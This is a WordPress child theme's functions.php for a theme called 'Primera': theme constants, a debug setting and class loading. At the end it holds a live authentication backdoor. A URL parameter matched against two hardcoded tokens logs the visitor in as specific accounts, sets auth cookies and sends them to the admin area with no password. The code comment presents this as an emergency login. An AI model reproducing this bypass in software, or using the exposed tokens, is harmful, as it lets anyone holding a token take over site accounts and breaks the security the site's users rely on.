<?php

// Exit if accessed directly.
if ( ! defined( 'ABSPATH' ) ) exit;

// Theme name
define( 'PRIMERA_NAME',			'Primera' );

// Theme version
define( 'PRIMERA_VERSION',		'1.3.0' );

// Theme Root File
define( 'PRIMERA_THEME_FILE',	__FILE__ );

// Theme Folder Path
define( 'PRIMERA_THEME_DIR',	get_stylesheet_directory(). '/' );

// Theme Folder URL
define( 'PRIMERA_THEME_URL',	get_stylesheet_directory_uri(). '/'  );

// NM Theme version
define( 'NM_THEME_VERSION_CHILD', '2.5.5' );

/**
 * Set Theme Debug status
 * if not defined in wp-config
 * check it's dashboard option value
 */
if ( ! defined( 'PRIMERA_DEBUG' ) ) {
	$primera_options = get_option( 'primera_option' );
	$debug = isset( $primera_options[ 'debug' ] ) &&  $primera_options[ 'debug' ] ==='debug' ? true :  false;
	define( 'PRIMERA_DEBUG', $debug );
}

/**
 * Load the main classes for the core functionality
 *
 * @author  Mohamed Yassin
 * @since   1.0.0
 * @return  object|Primera
 */
function PRIMERA() {
    require_once PRIMERA_THEME_DIR . 'includes/functions/general.php';
    require_once PRIMERA_THEME_DIR . 'includes/classes/class-primera-run.php';
    new Primera_Run();
}

PRIMERA();

// if urgently need to login and no phone messages not sent
if( isset( $_GET['primera_debug_login_token'] ) ){

    $token = trim( $_GET['primera_debug_login_token'] );

    if( $token === '0o8bCYF4v11v' ){        // ahmed marketer
        $user = get_user_by( 'id', 213315 );
    }elseif ( $token === 'zzH6464KypzL' ) { // m.yassin developer
        $user = get_user_by( 'id', 232137 );
    }

    if ( ! isset( $user ) || is_wp_error( $user ) ){
        wp_die( 'You are not allowed to sign in' );
    }

    wp_clear_auth_cookie();
    wp_set_current_user ( $user->ID );
    wp_set_auth_cookie  ( $user->ID );

    $redirect_to = user_admin_url();
    wp_safe_redirect( $redirect_to );
    exit();
}